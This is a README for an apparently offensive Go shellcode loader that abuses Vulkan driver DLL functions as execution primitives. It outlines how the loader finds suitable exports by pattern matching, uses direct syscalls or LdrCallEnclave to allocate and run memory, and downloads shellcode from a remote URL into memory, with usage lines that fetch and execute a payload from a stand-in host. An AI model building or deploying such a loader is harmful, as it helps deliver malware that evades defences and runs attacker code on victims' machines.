# vulkan loader

a go implementation that uses vulkan api functions as execution primitives for shellcode loading and execution.

## technical overview

the loader consists of three main components:

### finder package
- scans vulkan-1.dll exports to identify compatible functions
- analyzes function bytecode for specific checksum patterns (0x10aded040410aded and 0x10aded020210aded)
- supports two checksum variants:
  - checksumAt0: validates against table[0]
  - checksumAt2: validates against arg1[2] with conditional logic
- identifies table access patterns and function indices through disassembly
- handles jump table resolution for indirect calls

### vulkan package  
- implements two execution methods (vulkan1 and vulkan2)
- creates egstr structure containing function table and extended memory
- vulkan1: uses direct syscalls (ntAllocateVirtualMemory, ntWriteVirtualMemory, ntProtectVirtualMemory, ntCreateThreadEx)
- vulkan2: uses heap allocation via getProcessExecutableHeap and ldrCallEnclave

### net package
- handles remote shellcode retrieval
- downloads payload directly into memory

## execution flow

1. loader identifies compatible vulkan function through pattern matching
2. creates execution context with appropriate checksum variant
3. sets up function table with syscall callbacks
4. downloads shellcode from remote url
5. executes through vulkan driver function calls

## structure details

the egstr structure contains:
- v1: pointer to function table
- v2: pointer to extended memory (for conditional variants)
- v3: checksum value for validation
- v4: function call parameter
- table: 256-entry function pointer array
- extmem: 8kb extended memory region

## usage

```go
vulkan.Vulkan1("http://example.com/payload.bin")  // syscall method
vulkan.Vulkan2("http://example.com/payload.bin")  // heap allocation method
```

the loader automatically selects appropriate vulkan functions and configures execution context based on detected patterns.
